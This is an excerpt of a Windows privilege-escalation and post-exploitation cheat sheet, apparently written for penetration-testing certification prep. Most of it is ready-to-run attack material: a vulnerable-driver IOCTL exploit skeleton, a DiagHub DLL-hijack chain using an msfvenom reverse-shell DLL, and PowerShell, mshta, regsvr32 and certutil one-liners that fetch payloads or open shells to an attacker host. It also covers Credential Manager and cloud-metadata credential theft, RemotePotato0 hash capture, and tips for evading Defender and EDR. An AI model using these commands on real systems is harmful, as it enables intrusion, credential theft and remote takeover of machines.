> **Group Policy gotcha:** `Computer Config → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Create symbolic links` controls this. CPTS labs occasionally grant it to a service user — always check `whoami /priv` for the full set.

### 4.21h SeTrustedCredManAccessPrivilege Exploitation
```powershell
# "Access Credential Manager as a trusted caller" — CredentialManager API normally returns only the caller's vault entries.
# With this priv, you can call CredEnumerate / CredRead with TrustedCallerFlag and read OTHER users' Credential Manager entries.
# Holders: Backup operators, some service accounts on RDS/Citrix gateways, deliberately granted accounts.

whoami /priv | findstr /i SeTrustedCredManAccess

# Read all credentials from current logon (still works without the priv)
cmdkey /list

# Cross-user read with the trusted-caller flag — needs a wrapper around CredEnumerate(TRUSTED_CALLER)
# PoC: SharpDPAPI / Mimikatz vault::list (when running with the priv, it iterates other users' vaults)
.\SharpDPAPI.exe vaults
# → enumerates DPAPI vaults of all users present in C:\Users\ — credentials, RDP, browser SSO

# Why this is dangerous: lets you grab DA / service-account creds left in Credential Manager by other users
# without dumping LSASS or hitting SAM. Quiet, targeted, evades most cred-dumping detections.
```

### 4.21c Pre-Installed Vulnerable Driver Discovery (BYOVD without SeLoadDriverPrivilege)

When `SeLoadDriverPrivilege` is absent but the target ships an OEM/vendor driver that's already loaded, abuse the existing DeviceObject directly — no driver-load step required. Baseline against a vanilla VM matching the target build, diff for outliers, then cross-reference [loldrivers.io](https://www.loldrivers.io/) and [magicsword-io/LOLDrivers](https://github.com/magicsword-io/LOLDrivers).

```cmd
:: Enumerate target services + drivers + filter drivers
sc query state= all type= all | findstr SERVICE_NAME > services.txt
driverquery /v > drivers.txt
driverquery /si /fo csv > signed_drivers.csv
fltmc filters
fltmc instances
```

```powershell
# PowerShell — richer enumeration (paths, signing state, provider)
Get-CimInstance Win32_SystemDriver | Select Name,DisplayName,State,PathName,StartMode |
  Export-Csv drivers.csv -NoTypeInformation
Get-CimInstance Win32_PnPSignedDriver | Select DeviceName,DriverProviderName,DriverVersion,IsSigned,InfName |
  Export-Csv signed.csv -NoTypeInformation

# Flag drivers loaded from non-standard paths (anything NOT in C:\Windows\System32\drivers)
Get-CimInstance Win32_SystemDriver |
  Where-Object { $_.PathName -notmatch '\\System32\\drivers\\' -and $_.State -eq 'Running' } |
  Format-Table Name,PathName -AutoSize
```

```bash
# Baseline diff — collect vanilla services/drivers on a Microsoft Evaluation Center VM
# matching the target's exact build, then diff
diff vanilla_services.txt target_services.txt | grep '^>'
diff vanilla_drivers.txt  target_drivers.txt  | grep '^>'

# Cross-reference outliers against the LOLDrivers project
# https://www.loldrivers.io
# https://github.com/magicsword-io/LOLDrivers
```

> **Common pre-installed targets** — probe their DeviceObject names before falling back to §4.21:
> | Driver | DeviceObject | CVE / capability |
> |---|---|---|
> | `Capcom.sys` | `\\.\Htsysm72FB` | arbitrary kernel-mode code exec |
> | `dbutil_2_3.sys` (Dell) | `\\.\DBUtil_2_3` | CVE-2021-21551 — arbitrary R/W |
> | `gdrv.sys` (Gigabyte) | `\\.\GIO` | CVE-2018-19320 — MSR R/W |
> | `AsrDrv101.sys` (ASRock) | `\\.\AsrDrv101` | arbitrary R/W |
> | `RTCore64.sys` (MSI) | `\\.\RTCore64` | CVE-2019-16098 — MSR R/W |
> | `iqvw64e.sys` (Intel) | `\\.\Nal` | CVE-2015-2291 — physical-memory R/W |

```text
# Metasploit — Capcom is the canonical example
msfconsole
use exploit/windows/local/capcom_sys_exec
set SESSION <id>
run
```

```powershell
# Direct DeviceObject open — no SeLoadDriverPrivilege needed; driver already loaded
# Test reachability before launching exploit code
Get-Item \\.\Capcom         -ErrorAction SilentlyContinue
Get-Item \\.\DBUtil_2_3     -ErrorAction SilentlyContinue
Get-Item \\.\RTCore64       -ErrorAction SilentlyContinue
```

> **Tip:** Probe for known device names FIRST. If one returns a handle, you skip the §4.21 SeLoadDriver-required path entirely — the driver is already in the kernel waiting to be talked to.

> **OPSEC:** `driverquery` and `fltmc` are signed Microsoft LOLBins, low-noise on EDR. The diff and LOLDrivers cross-reference happen **attacker-side** — only the driver enumeration runs on target.

#### 4.21c-2 Custom Vulnerable Driver RE — Ghidra Analysis + IOCTL Exploitation

When a non-LOLDrivers custom driver is discovered (vendor-specific, not in public databases), reverse-engineer it in Ghidra to find exploitable IOCTL handlers, then invoke via `DeviceIoControl`.

```bash
# === Pull the driver binary to attacker box for RE ===
# From target (after identifying the .sys path via driverquery or CimInstance):
copy "C:\Windows\System32\drivers\<CUSTOM_DRIVER>.sys" \\<ATTACKER_IP>\share\

# === Ghidra RE workflow (attacker box) ===
# 1. Import the .sys as a PE/COFF binary (x64)
# 2. Analyze → find DriverEntry function (entry point)
# 3. In DriverEntry, locate MajorFunction[IRP_MJ_DEVICE_CONTROL] assignment
#    (offset 0x70 in DriverObject->MajorFunction array = IRP_MJ_DEVICE_CONTROL = 14)
# 4. Follow the IOCTL dispatch function
# 5. Map IOCTL codes: CTL_CODE(DeviceType, Function, Method, Access)
#    Switch/case on IoControlCode from IRP → Io->Parameters.DeviceIoControl.IoControlCode
# 6. Look for: MmMapLockedPages, ProbeForWrite, memcpy to/from user buffer,
#    MmGetPhysicalAddress, or direct physical memory R/W primitives
```

```c
/* === Exploit skeleton — invoke discovered IOCTL from userland ===
   Compile on Kali: x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -static */
#include <windows.h>
#include <stdio.h>

#define IOCTL_CODE <DISCOVERED_IOCTL_CODE>  // e.g., 0x9C402420

int main() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\<DEVICE_NAME>", GENERIC_READ | GENERIC_WRITE,
                                  0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Device handle obtained\n");

    // Craft input buffer per RE findings
    BYTE inBuf[0x100] = {0};
    BYTE outBuf[0x100] = {0};
    DWORD bytesReturned = 0;

    // Populate inBuf based on Ghidra-identified structure
    // e.g., *(PULONG64)(inBuf) = targetAddress; *(PULONG64)(inBuf+8) = value;

    BOOL result = DeviceIoControl(hDevice, IOCTL_CODE, inBuf, sizeof(inBuf),
                                   outBuf, sizeof(outBuf), &bytesReturned, NULL);
    if (result) {
        printf("[+] IOCTL succeeded, bytes returned: %d\n", bytesReturned);
    } else {
        printf("[-] IOCTL failed: %d\n", GetLastError());
    }
    CloseHandle(hDevice);
    return 0;
}
```

```bash
# Cross-compile on Kali
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static
```

#### Living-off-the-land / LOTL variant

```powershell
# PowerShell P/Invoke to call DeviceIoControl without compiling on target
$code = @'
using System;
using System.Runtime.InteropServices;
public class Driver {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, byte[] lpInBuffer, uint nInBufferSize, byte[] lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
}
'@
Add-Type $code
$h = [Driver]::CreateFile("\\.\<DEVICE_NAME>", 0xC0000000, 0, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
$inBuf = New-Object byte[] 256
$outBuf = New-Object byte[] 256
$ret = [uint32]0
[Driver]::DeviceIoControl($h, <IOCTL_CODE>, $inBuf, 256, $outBuf, 256, [ref]$ret, [IntPtr]::Zero)
[Driver]::CloseHandle($h)
```

---

### 4.21d DiagHub StandardCollectorService — Arbitrary-Write-to-System32 → SYSTEM

> **Forshaw / Project Zero (2018):** `StandardCollector.Service.exe` runs as SYSTEM and exposes a COM/RPC `AddAgent` method that calls `LoadLibrary` on a DLL **by name** from `C:\Windows\System32` — no full path, no signature check. Combine with any write-to-System32 primitive (4.21b SeManageVolume, untrusted-arg service, symlink+Tasks, weak service ACL) to convert it into deterministic SYSTEM code execution.

```powershell
# Confirm DiagHub is present (default Win10 1803+ / Server 2019)
Get-Service -Name 'diagnosticshub.standardcollector.service'
dir C:\Windows\System32\StandardCollector.Service.exe
```

```bash
# 1. Build attacker DLL — payload runs in DllMain when LoadLibrary fires as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f dll -o <DLL_NAME>.dll
```

```powershell
# 2. Drop the DLL into System32 — needs a write-to-System32 primitive first
#    (chain from §4.21b SeManageVolume, §4.3 weak service ACL writing System32, or symlink/Tasks chain)
copy <DLL_NAME>.dll C:\Windows\System32\<DLL_NAME>.dll

# 3. Trigger DiagHub to LoadLibrary your DLL by name (no full path, runs as SYSTEM)
# https://github.com/decoder-it/diaghub_exploit
.\diaghub.exe <DLL_NAME>.dll
# DiagHub COM/RPC AddAgent → LoadLibrary("<DLL_NAME>.dll") in SYSTEM context
```

```bash
# 4. Catch the SYSTEM callback
rlwrap nc -lvnp <ATTACKER_PORT>
# whoami → nt authority\system
```

> **OPSEC:** DiagHub service spawning a non-Microsoft DLL out of System32 is a strong IOC (Sysmon 7 image-load + signed/unsigned mismatch). For detection-validation runs this is exactly the chain blue team should fire on.

> **Chains well with:** §4.21b (SeManageVolume → write to System32), §4.3 (weak service ACL writing into System32), §4.21 (SeLoadDriverPrivilege when DiagHub itself is patched).

---

### 4.22 Reverse Shell One-Liners & References

> Generate reverse shells for any language/platform: [https://www.revshells.com](https://www.revshells.com)
> Unix binary exploitation / shell escapes: [https://gtfobins.github.io](https://gtfobins.github.io)
> Windows binary LOLBins: [https://lolbas-project.github.io](https://lolbas-project.github.io)

#### Native (No External Tools on Target)
```powershell
# PowerShell reverse shell (one-liner — works on any modern Windows)
powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# PowerShell Base64-encoded reverse shell (evades basic filtering)
# Generate on attacker:
# echo -n 'IEX(IWR http://<ATTACKER_IP>/shell.ps1 -UseBasicParsing)' | iconv -t UTF-16LE | base64 -w0
powershell -nop -ep bypass -enc <BASE64_PAYLOAD>

# PowerShell download-cradle + execute (fileless)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')"

# mshta.exe reverse shell (native LOLBin — bypasses AppLocker in some configs)
mshta http://<ATTACKER_IP>/payload.hta
# Generate HTA: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o payload.hta

# regsvr32 reverse shell (native LOLBin — AppLocker bypass)
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/payload.sct scrobj.dll

# VBScript reverse shell (native — works even without PowerShell)
# Create on target or download:
# Set objShell = CreateObject("WScript.Shell")
# objShell.Run "cmd.exe /c powershell -ep bypass -c ""IEX(...)"""
cscript //nologo C:\temp\shell.vbs

# cmd.exe only — download and execute via certutil (no PowerShell at all)
certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/nc.exe C:\temp\nc.exe
C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
```

#### With External Tools on Target
```powershell
# Netcat (if available on target)
nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
.\ncat.exe <ATTACKER_IP> <PORT> -e cmd.exe

# Nishang Invoke-PowerShellTcp (download + execute)
# https://github.com/samratashok/nishang
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')"
# Add to bottom of script: Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>

# ConPty shell (fully interactive — upgrade from dumb shell)
# https://github.com/antonioCoco/ConPtyShell
IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <ATTACKER_IP> -RemotePort <PORT>
# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp <PORT>
```

> For file transfer methods to get tools onto target, see [file-transfers.md](file-transfers.md).

### 4.23 RunasCs — Run Commands as Another User (No GUI)
```powershell
# RunasCs is essential when you have creds but no interactive logon (e.g., WinRM/reverse shell)
# Unlike runas.exe, it does NOT require an interactive desktop session
# https://github.com/antonioCoco/RunasCs

# Run command as another user
# 🟡 logged — explicit credential logon = EID 4624 logon-type 9 (NewCredentials) or 2/3 with seclogon spawn; "RunasCs" string in process args is on Defender's signature list — rename binary
.\RunasCs.exe <USER> <PASSWORD> cmd.exe

# Reverse shell as another user
.\RunasCs.exe <USER> <PASSWORD> cmd.exe -r <ATTACKER_IP>:<PORT>

# With domain user
.\RunasCs.exe <USER> <PASSWORD> cmd.exe -d <DOMAIN> -r <ATTACKER_IP>:<PORT>

# Force a specific logon type (useful when default fails)
.\RunasCs.exe <USER> <PASSWORD> cmd.exe -l 8 -r <ATTACKER_IP>:<PORT>
# Logon types: 2=Interactive, 3=Network, 8=NetworkCleartext, 9=NewCredentials
```

#### 4.23.1 Fixing the "AD cmdlets fail over Evil-WinRM" Problem

Evil-WinRM, `nxc smb -x`, `wmiexec`, `psexec`, scheduled-task RCE — every one of these gives you a **Network (type 3)** or **NetworkCleartext (type 8)** logon token. PowerShell's ActiveDirectory module (`Get-ADObject`, `Get-ADUser`, `Restore-ADObject`, `Set-ADAccountPassword`, basically every `*-AD*` cmdlet) silently fails or returns empty results against these tokens, even when the underlying account has the right.

**Symptoms (you have valid creds, you can confirm membership in the right group, but the cmdlet still fails):**

| Symptom | Trigger |
|---|---|
| `Get-ADObject -IncludeDeletedObjects` returns nothing | netonly token can't read `CN=Deleted Objects` |
| `Restore-ADObject` → `Insufficient access rights` | Same — DACL check fails on the network token |
| `Set-ADAccountPassword` → `Access is denied` | LDAP bind succeeds but write fails |
| `New-PSSession` to a second host → `Access is denied` | Classic double-hop, kerberos delegation not configured |
| Custom GPO PowerShell scripts return nothing for `Get-Acl AD:\…` | `AD:` PSDrive needs interactive-equivalent token |

**Root cause:** WinRM produces tokens flagged with `LOGON32_LOGON_NETWORK` (or NetworkCleartext when CredSSP / Basic auth). The `AD:` PSDrive provider and many AD cmdlets perform secondary credential checks that require an interactive-equivalent token (specifically `LOGON32_LOGON_NEW_CREDENTIALS` — type 9, aka *runas /netonly*). The user has the right; the *token* doesn't.

**Fix — re-issue your own creds via RunasCs with `-l 9`:**

```powershell
# Bounce yourself into a type-9 token shell using your own creds
# 🟡 logged — explicit credential logon, EID 4624 type 9 on the host
.\RunasCs.exe <USER> <PASSWORD> "powershell.exe -NoProfile -ExecutionPolicy Bypass" -l 9

# Or run a one-shot AD cmdlet directly:
.\RunasCs.exe <USER> <PASSWORD> "powershell.exe -NoProfile -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -SearchBase 'CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'" -l 9

# With domain explicit (when sAMAccountName ambiguous across trusts):
.\RunasCs.exe <USER> <PASSWORD> cmd.exe -d <DOMAIN> -l 9
```

**Verify the fix worked:**
```powershell
# Inside the new shell — confirm token type
whoami /all | findstr /i "logon type"
# Expected: "Logon Type: NewCredentials" or numeric 9

# Sanity-check an AD cmdlet
Get-ADUser <USER> -Properties memberOf
# Should now succeed where it previously returned nothing
```

> **Why not CredSSP / `Enable-WSManCredSSP`?** Works but requires a second authentication factor and changes WinRM config on both hosts (visible artifact, breaks back). Type 9 with RunasCs is artifact-light and reverts the moment the shell exits.

> **AppLocker / Defender will flag `RunasCs.exe`.** Rename the binary (`RunasCs.exe` is on Defender's signature list) and consider an in-memory load via reflection — see [av-evasion.md](av-evasion.md) and [windows-methodology.md §4.10 AMSI & ETW Bypass](#410-amsi-etw-bypass-critical-for-powershell-tooling).

#### 4.23b Credential Manager Dump from Network-Logon Shell (RunasCs -ForceProfile)

When your shell is a type-3 network logon (Evil-WinRM, wmiexec, psexec), the user's DPAPI-protected Credential Manager entries are inaccessible because the profile is not loaded. Use `RunasCs` with `-ForceProfile` to spawn an interactive (type-2) logon that loads the user profile and DPAPI master keys, then dump Credential Manager.

```powershell
# Confirm current shell cannot read CredMan (returns empty or access denied)
cmdkey /list
# Expected: "Currently stored credentials: * NONE *" even though creds exist

# Spawn interactive logon with profile loaded — enables DPAPI decryption
.\RunasCs.exe <USER> <PASSWORD> "powershell.exe -NoProfile" -l 2 --force-profile

# Inside the new shell — Credential Manager is now accessible
cmdkey /list
# Should show TERMSRV/<HOST>, Domain:target=<DOMAIN>\<USER>, etc.

# Invoke-WCMDump — enumerate and decrypt Windows Credential Manager entries
# https://github.com/peewpw/Invoke-WCMDump
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-WCMDump.ps1')
Invoke-WCMDump

# Alternative: SharpDPAPI credentials (same user context with profile loaded)
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe vaults
```

#### Living-off-the-land / LOTL variant

```powershell
# Native Credential Manager read via VaultCli (no external tools, profile must be loaded)
# First spawn type-2 session via RunasCs as above, then:
VaultCmd /listcreds:"Windows Credentials" /all
VaultCmd /listcreds:"Web Credentials" /all

# CredentialManager PowerShell module (built into recent Windows)
Get-StoredCredential -Type Generic -AsCredentialObject
# Falls back to: cmdkey /list + runas /savecred for exploitation
```

### 4.23c Cross-Session NTLMv2 Hash Steal via RemotePotato0

When another user (often a DA) has an active session on the same host, `RemotePotato0` abuses DCOM cross-session activation to coerce their session into authenticating to an attacker-controlled HTTP listener, leaking their NTLMv2 hash without touching LSASS.

```powershell
# === Prerequisite: enumerate logged-on sessions ===
query user
qwinsta
# Look for sessions belonging to high-value accounts (DA, service accounts)

# Confirm you do NOT have SeImpersonate (otherwise use GodPotato instead)
whoami /priv
```

```bash
# === Attacker side: start ntlmrelayx or socat listener to capture the hash ===
# Option 1: ntlmrelayx in server-only mode (captures NTLMv2)
impacket-ntlmrelayx --no-http-server -smb2support -t <RELAY_TARGET> -c "whoami"
# Option 2: Responder on attacker interface
sudo responder -I <INTERFACE>
```

```powershell
# === On target: run RemotePotato0 ===
# https://github.com/antonioCoco/RemotePotato0
# -m 2 = capture NTLMv2 hash (no relay)
# -s <SESSION_ID> = target session from qwinsta output
.\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_PORT> -p <LOCAL_LISTENER_PORT> -s <SESSION_ID>

# Simplified mode — target the first non-current session automatically
.\RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_PORT> -p 9999
```

```bash
# === Crack the captured NTLMv2 hash ===
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Living-off-the-land / LOTL variant

```powershell
# No pure LOTL equivalent — DCOM cross-session activation requires the RemotePotato0 binary.
# Closest native approach: if you have local admin, use WMI to query logged-on users
# and then attempt token impersonation via named pipes (requires SeImpersonate).
Get-WmiObject Win32_LogonSession | Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
  ForEach-Object {
    $user = Get-WmiObject -Query "ASSOCIATORS OF {Win32_LogonSession.LogonId=$($_.LogonId)} WHERE AssocClass=Win32_LoggedOnUser" -ErrorAction SilentlyContinue
    if ($user) { Write-Output "Session $($_.LogonId): $($user.Domain)\$($user.Name) (Type $($_.LogonType))" }
  }
# For the actual hash steal, RemotePotato0.exe is unavoidable.
```

### 4.24 Internal Service Enumeration (Post-Foothold)
```powershell
# Find services listening only on localhost (invisible from outside)
netstat -ano | findstr "127.0.0.1"
netstat -ano | findstr "LISTENING"

# Common internal-only services:
# MSSQL (1433), MySQL (3306), Redis (6379), PostgreSQL (5432)
# Web admin panels (8080, 8443, 9090, 3000)
# Docker API (2375), Kubernetes (6443, 10250)

# Check running processes for services with credentials in command line
wmic process get commandline | findstr /i "password pass token"
Get-WmiObject Win32_Process | Select-Object CommandLine | Select-String -Pattern "password|pass=|token"

# Forward internal services for further exploitation
# See: [tunneling-pivoting.md](tunneling-pivoting.md) for SSH/Chisel/Ligolo port forwarding
```

### 4.25 Named Pipe Impersonation
```powershell
# Named pipes can be abused for privilege escalation when a privileged process
# connects to an attacker-controlled pipe

# List named pipes (native cmd.exe — no tools)
dir \\.\pipe\\

# PowerShell native:
[System.IO.Directory]::GetFiles("\\.\pipe\")
Get-ChildItem \\.\pipe\ | Select-Object Name

# Check pipe permissions (Sysinternals)
pipelist.exe /accepteula

# Common attack: create a rogue pipe, wait for a SYSTEM service to connect
# Tools: PrintSpoofer, GodPotato, and JuicyPotato all exploit pipe impersonation
# Custom: use CreateNamedPipe + ImpersonateNamedPipeClient API
```

### 4.26 Windows Credential Guard Awareness
```powershell
# Credential Guard (Win 10 Enterprise / Server 2016+) protects LSASS secrets
# If enabled, Mimikatz sekurlsa::logonpasswords will NOT dump plaintext passwords or NTLM hashes

# Check if Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
# SecurityServicesRunning = {1} means Credential Guard is active

# Alternative check
tasklist /fi "imagename eq lsaiso.exe"
# If lsaiso.exe is running → Credential Guard is active

# Workarounds when Credential Guard is enabled:
# 1. Kerberoasting (doesn't need LSASS) — see active-directory-methodology.md Phase 3.1
# 2. AS-REP Roasting
# 3. DPAPI extraction (browser creds, vault)
# 4. DCSync (if you have the rights)
# 5. Token impersonation (doesn't need creds)
# 6. Dump cached credentials from registry (MSCache2 — hashcat -m 2100)
reg save HKLM\SECURITY security.bak
# Parse offline with impacket-secretsdump
```

### 4.27 Cloud Metadata Credential Harvesting (Post-Foothold)

> After landing a shell on a Windows machine, always check if it runs in a cloud environment (AWS EC2, Azure VM, GCP Compute). Cloud metadata services expose temporary credentials, tokens, and configuration data accessible from localhost.

#### Detect Cloud Environment
```powershell
# Check for cloud CLI tools installed on the system
where.exe aws 2>$null
where.exe az 2>$null
where.exe gcloud 2>$null

# Check common install paths
Test-Path "C:\Program Files\Amazon\AWSCLIV2\aws.exe"
Test-Path "C:\Program Files (x86)\Microsoft SDKs\Azure\CLI2\wbin\az.cmd"
Test-Path "$env:LOCALAPPDATA\Google\Cloud SDK\google-cloud-sdk\bin\gcloud.cmd"

# Check environment variables for cloud indicators
Get-ChildItem Env: | Where-Object { $_.Name -match 'AWS|AZURE|GCP|GOOGLE|CLOUD' }
```

#### AWS — IMDSv1 (No Token Required)
```powershell
# Query instance metadata directly (IMDSv1 — simple GET)
Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/ -UseBasicParsing
Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/ -UseBasicParsing

# Get temporary credentials for the attached IAM role
$role = (Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/ -UseBasicParsing).Content
Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -UseBasicParsing

# User data (may contain bootstrap scripts with secrets)
Invoke-WebRequest -Uri http://169.254.169.254/latest/user-data -UseBasicParsing
```

#### AWS — IMDSv2 (Token Required)
```powershell
# Step 1: Get session token (PUT request with TTL header)
$token = (Invoke-WebRequest -Method PUT -Uri http://169.254.169.254/latest/api/token `
  -Headers @{"X-aws-ec2-metadata-token-ttl-seconds" = "21600"} -UseBasicParsing).Content

# Step 2: Query metadata with token
Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/ `
  -Headers @{"X-aws-ec2-metadata-token" = $token} -UseBasicParsing

$role = (Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/ `
  -Headers @{"X-aws-ec2-metadata-token" = $token} -UseBasicParsing).Content
Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" `
  -Headers @{"X-aws-ec2-metadata-token" = $token} -UseBasicParsing

# Alternative: use curl.exe (always available on modern Windows)
curl.exe -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl.exe -s -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

#### AWS — Credential Files
```powershell
# Check all user profiles for stored AWS credentials
Get-ChildItem C:\Users\*\.aws\credentials -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`n--- $($_.FullName) ---"; Get-Content $_ }
Get-ChildItem C:\Users\*\.aws\config -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`n--- $($_.FullName) ---"; Get-Content $_ }

# Environment variables with AWS keys
$env:AWS_ACCESS_KEY_ID
$env:AWS_SECRET_ACCESS_KEY
$env:AWS_SESSION_TOKEN
```

#### Azure — IMDS (Instance Metadata Service)
```powershell
# Azure IMDS requires Metadata:true header — no auth token needed
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" `
  -Headers @{Metadata = "true"} -Method GET

# Get managed identity access token (most valuable — grants access to Azure resources)
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" `
  -Headers @{Metadata = "true"} -Method GET

# Token for Microsoft Graph API
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" `
  -Headers @{Metadata = "true"} -Method GET

# Token for Key Vault access
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" `
  -Headers @{Metadata = "true"} -Method GET
```

#### Azure — Environment Variables & Cached Tokens
```powershell
# Azure environment variables (Service Principals, Managed Identity hints)
$env:AZURE_CLIENT_ID
$env:AZURE_CLIENT_SECRET
$env:AZURE_TENANT_ID
$env:AZURE_SUBSCRIPTION_ID
$env:MSI_ENDPOINT
$env:MSI_SECRET

# Azure CLI cached tokens (if az CLI is installed)
Get-Content "$env:USERPROFILE\.azure\accessTokens.json" -ErrorAction SilentlyContinue
Get-Content "$env:USERPROFILE\.azure\azureProfile.json" -ErrorAction SilentlyContinue

# Get access token via az CLI (if already authenticated)
az account get-access-token
az account get-access-token --resource https://graph.microsoft.com

# Azure PowerShell cached context
Get-Content "$env:USERPROFILE\.Azure\AzureRmContext.json" -ErrorAction SilentlyContinue
# If Az module is loaded, try:
Connect-AzAccount -Identity   # Uses managed identity
(Get-AzAccessToken).Token     # Retrieve cached token
```

#### GCP — Metadata Server
```powershell
# GCP metadata (requires Metadata-Flavor header)
Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/" `
  -Headers @{"Metadata-Flavor" = "Google"} -Method GET

# Get service account access token
Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" `
  -Headers @{"Metadata-Flavor" = "Google"} -Method GET

# List attached service accounts
Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" `
  -Headers @{"Metadata-Flavor" = "Google"} -Method GET

# Instance attributes (may contain startup scripts with secrets)
Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true" `
  -Headers @{"Metadata-Flavor" = "Google"} -Method GET

# Project-wide metadata
Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true" `
  -Headers @{"Metadata-Flavor" = "Google"} -Method GET

# With curl.exe
curl.exe -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

#### GCP — Credential Files
```powershell
# Application default credentials
Get-Content "$env:APPDATA\gcloud\application_default_credentials.json" -ErrorAction SilentlyContinue
Get-Content "$env:APPDATA\gcloud\credentials.db" -ErrorAction SilentlyContinue

# Check for service account key files (JSON)
Get-ChildItem -Path C:\Users -Recurse -Include *.json -ErrorAction SilentlyContinue | Select-String -Pattern '"type": "service_account"' -List
```

#### Terraform State Files
```powershell
# Terraform state files often contain plaintext secrets, API keys, and passwords
# Search for .tfstate files across all drives
Get-ChildItem -Path C:\ -Recurse -Include *.tfstate,*.tfstate.backup -ErrorAction SilentlyContinue

# Search common project directories
Get-ChildItem -Path C:\Users\*\Documents,C:\Users\*\Desktop,C:\Projects -Recurse -Include *.tfstate -ErrorAction SilentlyContinue

# Extract secrets from state files
Select-String -Path <TFSTATE_FILE> -Pattern '"password"|"secret"|"access_key"|"private_key"'
```

### 4.28 WSL Post-Exploitation — Lxss Registry & Rootfs Traversal

**Goal:** Enumerate registered WSL distros, read the Linux rootfs from Windows-side paths (no `bash.exe`/`wsl.exe` invocation, no Linux audit trail), and mine `.bash_history` / dotfiles for plaintext SMB / domain / cloud credentials.

#### Detect WSL — Registry, Filesystem, Per-User Package Store
```powershell
# Lxss registry — every registered WSL distro is enumerable here (no bash needed)
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | Out-String -Width 4096
# Returns DistributionName, BasePath (e.g. C:\Users\<USER>\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu*\LocalState)

# Filesystem hints at C:\ — manual Ubuntu.zip self-extracts often land here
Get-ChildItem C:\ -Force | Where-Object { $_.Name -match 'Ubuntu|Distros|Lxss' }
